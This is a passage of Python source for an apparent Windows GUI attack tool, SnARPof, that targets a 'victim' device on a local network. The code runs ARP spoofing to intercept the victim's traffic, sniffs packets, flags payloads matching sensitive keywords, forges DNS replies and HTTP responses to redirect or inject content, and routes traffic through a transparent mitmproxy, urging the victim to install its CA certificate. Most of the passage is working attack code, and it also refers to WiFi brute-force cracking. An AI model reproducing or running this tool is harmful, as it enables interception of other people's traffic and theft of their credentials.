        v_scrollbar.pack(side='right', fill='y')
        wifibrute_info_terminal=tkinter.Text(wifibrute_info_frame, wrap='word', yscrollcommand=self.v_scrollbar.set, bg=self.BLACK_BG, fg=self.LIME_FG, font=('Consolas', 9), selectbackground=self.LIME_FG, selectforeground=self.BLACK_BG, state=tkinter.NORMAL, cursor='arrow')
        wifibrute_info_terminal.tag_config('error', foreground='#FF0000', background=self.BLACK_BG, selectbackground='#FF0000', selectforeground=self.BLACK_BG)
        wifibrute_info_terminal.tag_config('success', foreground='#00FFFF', background=self.BLACK_BG, selectbackground='#00FFFF', selectforeground=self.BLACK_BG)
        wifibrute_info_terminal.tag_config('info', foreground='#FFD700', background=self.BLACK_BG, selectbackground='#FFD700', selectforeground=self.BLACK_BG)
        wifibrute_info_terminal.insert(tkinter.END, 'NOTE: Information about target WiFi will display here, when you start cracking ... \n')
        wifibrute_info_terminal.config(state=tkinter.DISABLED)
        wifibrute_info_terminal.pack(side='left', fill='both', expand=True)
        self.wifi_scan_id=wifibrute_window.after(1000, update_ssid_combobox)
        wifibrute_window.mainloop()
    def save_packets(self):
        file_name=filedialog.asksaveasfilename(title='Save network packets', filetypes=[('PCAP File', '*.pcap'), ('CAP File', '*.cap'), ('PCAPNG File', '*.pcapng')], defaultextension='.pcap')
        if not file_name:
            return
        try:
            wrpcap(file_name, self.scapy_packets)
            self.inform_user(f'Successfully saved data to: {file_name}', 'success')
        except Exception as e:
            self.inform_user(f'Error while saving data: {e}', 'error')
    def open_packets(self):
        file_name=filedialog.askopenfilename(title='Open network packets', filetypes=[('PCAP Files', '*.pcap *.cap *.pcapng')], defaultextension='.pcap')
        if not file_name:
            return
        try:
            loaded_packets=rdpcap(file_name)
            for packet in loaded_packets:
                packet.time=float(packet.time)
                self.process_packet(packet)
            self.inform_user(f'Successfully extracted data from: {file_name}', 'success')
        except Exception as e:
            self.inform_user(f'Error while reading data: {e}', 'error')
    def clear_packets(self):
        self.all_packets=[]
        self.scapy_packets=[]
        self.filtered_packets=[]
        self.packet_tree.delete(*self.packet_tree.get_children())
    def filter_packets(self):
        current_time=self.timestamp.get()
        version=self.ip_version.get()
        ip_header_length=self.ip_header_length.get()
        length=self.transport_header_length.get()
        protocol=self.protocol.get()
        s_addr=self.source_address.get()
        source_port=self.source_port.get()
        d_addr=self.destination_address.get()
        dest_port=self.destination_port.get()
        readable_data=self.data_payload.get()
        self.filter_options={'Timestamp': current_time, 'IP version': version, 'IP header length': ip_header_length, 'Transport header length': length, 'Protocol': protocol, 'Source address': s_addr, 'Source port': source_port, 'Destination address': d_addr, 'Destination port': dest_port, 'Data payload': readable_data}
        self.filtered_packets=[]
        for i in self.all_packets:
            if((version=='both' or i['IP version']==version)and(protocol.lower() in ('all', '') or i['Protocol'].lower()==protocol.lower())and(not current_time or current_time.lower() in i['Timestamp'].lower())and(ip_header_length in ('0','') or i['IP header length']==ip_header_length)and(length in ('0','') or i['Transport header length']==length)and(s_addr in ('0.0.0.0','') or s_addr.lower()==i['Source address'].lower())and(source_port in ('0','') or i['Source port']==source_port)and(d_addr in ('0.0.0.0','') or d_addr.lower()==i['Destination address'].lower())and(dest_port in ('0','') or i['Destination port']==dest_port)and(not readable_data or readable_data.lower() in i['Data payload'].lower())):
                self.filtered_packets.append(i)
        self.packet_tree.delete(*self.packet_tree.get_children())
        for i in self.filtered_packets:
            last_item=self.packet_tree.insert(parent='', index='end', values=(i['Timestamp'], i['IP version'], i['IP header length'], i['Transport header length'], i['Protocol'], i['Source address']+':'+i['Source port'], i['Destination address']+':'+i['Destination port'], i['Data payload']))
            for keyword in self.sensetive_data_keywords:
                if keyword in i['Data payload'].lower():
                    self.packet_tree.item(last_item, tags=('sensetive',))
                    break
    def show_packet_detailed(self, event):
        selected_rows=self.packet_tree.selection()
        if not selected_rows:
            self.inform_user('NOTE: Information about traffic will display here, when you select the row, if it\'s not displaying, then click \'Filter\' button and try again ... ')
            return
        row_id=selected_rows[0]
        row_index=self.packet_tree.index(row_id)
        if self.filtered_packets:
            if row_index>=len(self.filtered_packets): return
            packet_data=self.filtered_packets[row_index]
        else:
            if row_index>=len(self.all_packets): return
            packet_data=self.all_packets[row_index]
        scapy_pkt=packet_data.get('scapy_pkt')
        self.info_terminal.config(state=tkinter.NORMAL)
        self.info_terminal.delete(1.0, tkinter.END)
        if scapy_pkt:
            self.info_terminal.insert(tkinter.END, scapy_pkt.show(dump=True)+'\n\n')
            if Raw in scapy_pkt:
                payload=scapy_pkt[Raw].load
                self.info_terminal.insert(tkinter.END, f'[+] Data payload (hexdump format): \n\n{hexdump(payload, dump=True)}\n\n')
                if TCP in scapy_pkt and (scapy_pkt[TCP].dport==443 or scapy_pkt[TCP].sport==443):
                    sni=next(iter(re.findall(b'[a-z0-9.-]+\\.[a-z]{2,63}', payload)), b'Undefined').decode('utf-8', errors='ignore')
                    self.info_terminal.insert(tkinter.END, f'[+] SNI: {sni} ')
                    if sni!='Undefined':
                        self.info_terminal.insert(tkinter.END, '[MORE INFO]', 'info_sni')
                        self.info_terminal.tag_bind('info_sni', '<Button-1>', lambda e: self.address_info(sni))
                    self.info_terminal.insert(tkinter.END, '\n')
        source_addr=packet_data.get('Source address')
        dest_addr=packet_data.get('Destination address')
        self.info_terminal.insert(tkinter.END, f'[+] Source address: {source_addr} ')
        try:
            if source_addr and source_addr!='0.0.0.0' and not ipaddress.ip_address(source_addr).is_private:
                self.info_terminal.insert(tkinter.END, '[MORE INFO]', 'info_source')
                self.info_terminal.tag_bind('info_source', '<Button-1>', lambda e: self.address_info(source_addr))
        except ValueError:
            pass
        self.info_terminal.insert(tkinter.END, '\n')
        self.info_terminal.insert(tkinter.END, f'[+] Destination address: {dest_addr} ')
        try:
            if dest_addr and dest_addr!='0.0.0.0' and not ipaddress.ip_address(dest_addr).is_private:
                self.info_terminal.insert(tkinter.END, '[MORE INFO]', 'info_dest')
                self.info_terminal.tag_bind('info_dest', '<Button-1>', lambda e: self.address_info(dest_addr))
        except ValueError:
            pass
        self.info_terminal.insert(tkinter.END, '\n')
        self.info_terminal.yview_moveto(1.0)
        self.info_terminal.config(state=tkinter.DISABLED)
    def inform_user(self, text, status=None):
        self.info_terminal.config(state=tkinter.NORMAL)
        self.info_terminal.delete(1.0, tkinter.END)
        if status is not None:
            self.info_terminal.insert(tkinter.END, text+'\n', status)
        else:
            self.info_terminal.insert(tkinter.END, text+'\n')
        self.info_terminal.config(state=tkinter.DISABLED)
    def kill_server_process(self, port_num):
        pid_processess=[]
        results=subprocess.run(f'netstat -ano | findstr :{port_num}', capture_output=True, text=True, shell=True, encoding=f'cp{self.console_cp}', check=False, creationflags=subprocess.CREATE_NO_WINDOW)
        for line in results.stdout.strip().split('\n'):
            if not line.strip():
                continue
            parts=line.split()
            if parts:
                pid=parts[-1]
                if pid not in pid_processess and pid!='0':
                    pid_processess.append(pid)
        for pid in pid_processess:
            try:
                subprocess.run(f'taskkill /F /T /PID {pid}', shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
            except subprocess.CalledProcessError:
                continue
    def mitmproxy(self):
        try:
            self.is_mitmproxy=True
            self.stop_cert_event.clear()
            subprocess.run('netsh interface portproxy add v4tov4 listenport=443 listenaddress=0.0.0.0 connectport=8080 connectaddress=127.0.0.1', check=True, creationflags=subprocess.CREATE_NO_WINDOW)
            subprocess.run('netsh interface portproxy add v4tov4 listenport=80 listenaddress=0.0.0.0 connectport=8080 connectaddress=127.0.0.1', check=True, creationflags=subprocess.CREATE_NO_WINDOW)
            if os.path.exists(self.mitmproxy_ca_certificate_path):
                threading.Thread(target=self.cert_installer, args=(self.my_ip, 80), daemon=True).start()
            self.inform_user(f'NOTE: To make mitmproxy capture decrypted HTTPS traffic successfully, the target device must install mitmproxy\'s CA certificate from http://mitm.it or from http://{self.my_ip}:80 if the certificate exists on {self.mitmproxy_ca_certificate_path}')
            fixed_target=self.target_ip.replace('.', '\\.')
            self.mitm_process=subprocess.Popen(f'mitmproxy -s {self.snarpof_actions_path} --mode transparent --ssl-insecure --showhost --listen-host 0.0.0.0 --listen-port 8080 --view-filter "(~src {fixed_target} | ~dst {fixed_target}) ! ~u /_recorder_internal_/"', cwd=self.temp_dir, creationflags=subprocess.CREATE_NEW_CONSOLE)
            self.mitm_process.wait()
            subprocess.run('netsh interface portproxy delete v4tov4 listenport=80 listenaddress=0.0.0.0', check=True, creationflags=subprocess.CREATE_NO_WINDOW)
            subprocess.run('netsh interface portproxy delete v4tov4 listenport=443 listenaddress=0.0.0.0', check=True, creationflags=subprocess.CREATE_NO_WINDOW)
            self.is_mitmproxy=False
            self.inform_user('NOTE: Information about traffic will display here, when you select the row, if it\'s not displaying, then click \'Filter\' button and try again ... ')
        except subprocess.CalledProcessError:
            self.inform_user(f'Error while handling mitmproxy ... ', 'error')
        finally:
            self.stop_cert_event.set()
            if self.cert_socket:
                self.cert_socket.close()
            if self.htmlrep_window is not None:
                self.close_html_replacer()
            if self.htmlinj_window is not None:
                self.close_html_injector()
            if self.browserspy_window is not None:
                self.close_browserspy()
            self.mitm_process=None
            self.mitmproxy_button.after(0, lambda: self.mitmproxy_button.config(state=tkinter.NORMAL))
    def start_mitmproxy(self):
        if not (any(shutil.which(cmd) for cmd in ['mitmweb', 'mitmdump', 'mitmproxy']) or os.path.exists(os.path.join(os.environ.get('ProgramFiles', 'C:\\Program Files'), 'mitmproxy', 'bin', 'mitmweb.exe'))):
            self.inform_user('Error while starting mitmproxy: please install mitmproxy first ... ', 'error')
            subprocess.run(f'"{self.mitmproxy_installer_path}"', shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
            return
        if not self.is_intercept:
            self.inform_user('Error while starting mitmproxy: please intercept the victim\'s device traffic first ... ', 'error')
            return
        self.mitmproxy_button.config(state=tkinter.DISABLED)
        threading.Thread(target=self.mitmproxy, daemon=True).start()
    def start_intercepting(self):
        self.target_ip=self.victim_device.get().split(' - ')[0]
        if self.target_ip=='ATTENTION':
            self.inform_user('Error while starting traffic interception: please select the victim\'s device ... ', 'error')
            return
        try:
            ip_obj=ipaddress.ip_address(self.target_ip)
            if not ip_obj.is_private:
                self.inform_user('Error while starting traffic interception: the ip address of the victim is not private ... ', 'error')
                return
        except ValueError:
            self.inform_user('Error while starting traffic interception: the ip address of the victim is not valid ... ', 'error')
            return
        self.stop_arp_scan_event.set()
        with open(self.target_ip_path, 'w', encoding='utf-8') as f:
            f.write(self.target_ip)
        self.inform_user('NOTE: Information about traffic will display here, when you select the row, if it\'s not displaying, then click \'Filter\' button and try again ... ')
        self.intercept_button.config(text='Stop', command=self.stop_intercepting)
        self.stop_intercept_event.clear()
        self.is_intercept=True
        threading.Thread(target=self.spoofing_loop, args=(self.target_ip, self.gateway_ip), daemon=True).start()
        threading.Thread(target=self.sniff_packets, daemon=True).start()
    def stop_intercepting(self):
        self.stop_intercept_event.set()
        self.is_intercept=False
        if self.mitm_process and self.mitm_process.poll() is None:
            self.mitm_process.terminate()
            subprocess.run('netsh interface portproxy delete v4tov4 listenport=80 listenaddress=0.0.0.0', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            subprocess.run('netsh interface portproxy delete v4tov4 listenport=443 listenaddress=0.0.0.0', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            self.mitm_process=None
            self.is_mitmproxy=False
        self.intercept_button.config(text='Intercept', command=self.start_intercepting)
        self.stop_arp_scan_event.clear()
        threading.Thread(target=self.arp_scan, args=(str(ipaddress.IPv4Network(self.my_ip+'/'+self.get_subnet_mask(), strict=False)),), daemon=True).start()
    def spoof(self, target_ip, gateway_ip):
        target_mac=self.get_mac(target_ip)
        if not target_mac:
            return
        packet=Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        sendp(packet, verbose=False)
    def spoofing_loop(self, target_ip, gateway_ip):
        self.inform_user(f'[*] ARP spoofing to {self.target_ip} ... ', 'success')
        while not self.stop_intercept_event.is_set():
            self.spoof(target_ip, gateway_ip)
            self.spoof(gateway_ip, target_ip)
            if self.stop_intercept_event.wait(2):
                break
        self.inform_user('[*] Restoring ARP tables, to clean-up the tracks ... ', 'success')
        self.restore_arp_tables(target_ip, gateway_ip)
        self.inform_user('[+] ARP tables successfully restored ... ', 'success')
    def restore_arp_tables(self, target_ip, gateway_ip):
        target_mac=self.get_mac(target_ip)
        gateway_mac=self.get_mac(gateway_ip)
        if target_mac and gateway_mac:
            packet1=Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
            packet2=Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
            sendp(packet1, count=4, verbose=False)
            sendp(packet2, count=4, verbose=False)
    def sniff_packets(self):
        try:
            sniff(iface=self.adapter, prn=self.process_packet, filter=f'host {self.target_ip}', stop_filter=lambda x: self.stop_intercept_event.is_set(), store=0)
        except Exception as e:
            self.inform_user(f'Error while sniffing: {e}', 'error')
            self.stop_intercepting()
    def process_packet(self, packet):
        if packet.haslayer(ARP) or packet.src==self.my_mac:
            return
        elif packet.haslayer(Raw) and b'/_recorder_internal_/' in packet[Raw].load:
            return
        if packet.haslayer(DNS) and packet.haslayer(UDP):
            if (packet[UDP].dport==53 or packet[UDP].sport==53) and packet[DNS].qr==0:
                qname=packet[DNSQR].qname.decode('utf-8', errors='ignore').strip('.')
                if qname in self.dns_spoof_dict:
                    target_ip=self.dns_spoof_dict[qname]
                    dns_response=IP(src=packet[IP].dst, dst=packet[IP].src)/UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)/DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd, an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=target_ip))
                    del dns_response[IP].chksum
                    del dns_response[UDP].chksum
                    send(dns_response, verbose=False)
        if not self.is_mitmproxy and packet.haslayer(TCP) and packet.haslayer(Raw):
            if packet[TCP].dport==80 or packet[TCP].sport==80:
                request=packet[Raw].load.decode('utf-8', errors='ignore')
                if request.startswith('GET'):
                    lines=request.split('\r\n')
                    first_line=lines[0].split(' ')
                    path=first_line[1] if len(first_line)>1 else '/'
                    for line in lines:
                        if line.lower().startswith('host:'):
                            host=line.split(':')[1].strip()
                            break
                    url=f'http://{host}{path}'
                    if (url in self.url_respond_dict) or (url+'/' in self.url_respond_dict):
                        payload=self.url_respond_dict[url]
                        url_response=IP(src=packet[IP].dst, dst=packet[IP].src)/TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, flags='PA', seq=packet[TCP].ack, ack=packet[TCP].seq+len(request))/f'HTTP/1.1 200 OK\r\nContent-Length: {len(payload)}\r\nContent-Type: text/html; charset=UTF-8\r\nConnection: close\r\n\r\n{payload}'
                        del url_response[IP].chksum
                        del url_response[TCP].chksum
                        send(url_response, verbose=False)
        self.scapy_packets.append(packet)
        timestamp=datetime.fromtimestamp(float(packet.time)).strftime('%Y-%m-%d %H:%M:%S')
        ip_version='N/A'
        ip_header_len=0
        transport_len=0
        protocol='unknown'
        src_addr='0.0.0.0'
        dst_addr='0.0.0.0'
        src_port='0'
        dst_port='0'
        payload='N/A'
        if IP in packet:
            ip_version='IPv4'
            ip_header_len=packet[IP].ihl*4
            src_addr=packet[IP].src
            dst_addr=packet[IP].dst
            protocol=packet[IP].proto
            if protocol==6: protocol='TCP'
            elif protocol==17: protocol='UDP'
            elif protocol==1: protocol='ICMP'
            else: protocol=str(protocol)
        elif IPv6 in packet:
            ip_version='IPv6'
            ip_header_len=40
            src_addr=packet[IPv6].src
            dst_addr=packet[IPv6].dst
            protocol=packet[IPv6].nh
            if protocol==6: protocol='TCP'
            elif protocol==17: protocol='UDP'
            elif protocol==58: protocol='ICMPv6'
            else: protocol=str(protocol)
        if TCP in packet:
            src_port=str(packet[TCP].sport)
            dst_port=str(packet[TCP].dport)
            transport_len=packet[TCP].dataofs*4
            sport=packet[TCP].sport
            dport=packet[TCP].dport
            if sport==20 or dport==20: protocol='FTP [data transfer]'
            elif sport==21 or dport==21: protocol='FTP [controll]'
            elif sport==22 or dport==22: protocol='SSH'
            elif sport==23 or dport==23: protocol='Telnet'
            elif sport==53 or dport==53: protocol='DNS'
            elif sport==80 or dport==80: protocol='HTTP'
            elif sport==110 or dport==110: protocol='POP3'
            elif sport==139 or dport==139: protocol='NetBIOS [datagram service]'
            elif sport==143 or dport==143: protocol='IMAP'
            elif sport==443 or dport==443: protocol='HTTPS'
            elif sport==445 or dport==445: protocol='SMB'
            elif sport==3389 or dport==3389: protocol='RDP'
        elif UDP in packet:
            src_port=str(packet[UDP].sport)
            dst_port=str(packet[UDP].dport)
            transport_len=8
            sport=packet[UDP].sport
            dport=packet[UDP].dport
            if sport==53 or dport==53: protocol='DNS'
            elif sport==67 or dport==67: protocol='DHCP [server to client]'
            elif sport==68 or dport==68: protocol='DHCP [client to server]'
            elif sport==69 or dport==69: protocol='TFTP'
            elif sport==123 or dport==123: protocol='NTP'
            elif sport==138 or dport==138: protocol='NetBIOS [name service]'
            elif sport==161 or dport==161: protocol='SNMP'
        elif ICMP in packet:
            transport_len=8
        if Raw in packet:
            payload=repr(packet[Raw].load).lstrip('b').strip("'")
        packet_dict={'Timestamp': timestamp, 'IP version': ip_version, 'IP header length': str(ip_header_len), 'Transport header length': str(transport_len), 'Protocol': protocol, 'Source address': src_addr, 'Source port': src_port, 'Destination address': dst_addr, 'Destination port': dst_port, 'Data payload': payload, 'scapy_pkt': packet}
        self.all_packets.append(packet_dict)
        if((self.filter_options['IP version']=='both' or ip_version==self.filter_options['IP version'])and(self.filter_options['Protocol'].lower() in ('all', '') or protocol.lower()==self.filter_options['Protocol'].lower())and(not self.filter_options['Timestamp'] or self.filter_options['Timestamp'].lower() in timestamp.lower())and(self.filter_options['IP header length'] in ('0','') or str(ip_header_len)==self.filter_options['IP header length'])and(self.filter_options['Transport header length'] in ('0','') or str(transport_len)==self.filter_options['Transport header length'])and(self.filter_options['Source address'] in ('0.0.0.0','') or self.filter_options['Source address'].lower()==src_addr.lower())and(self.filter_options['Source port'] in ('0','') or src_port==self.filter_options['Source port'])and(self.filter_options['Destination address'] in ('0.0.0.0','') or self.filter_options['Destination address'].lower()==dst_addr.lower())and(self.filter_options['Destination port'] in ('0','') or dst_port==self.filter_options['Destination port'])and(not self.filter_options['Data payload'] or self.filter_options['Data payload'].lower() in payload.lower())):
            last_item=self.packet_tree.insert(parent='', index='end', values=(timestamp, ip_version, ip_header_len, transport_len, protocol, f'{src_addr}:{src_port}', f'{dst_addr}:{dst_port}', payload))
            for keyword in self.sensetive_data_keywords:
                if keyword in payload.lower():
                    self.packet_tree.item(last_item, tags=('sensetive',))
                    break
            self.packet_tree.see(last_item)
if __name__=='__main__':
    threading.Thread(target=ip_forwarding, daemon=True).start()
    set_appearance_mode('Dark')
    main_window=CTk()
    SnARPof(main_window, base_path)
    main_window.mainloop()
    ip_forwarding(enable=False)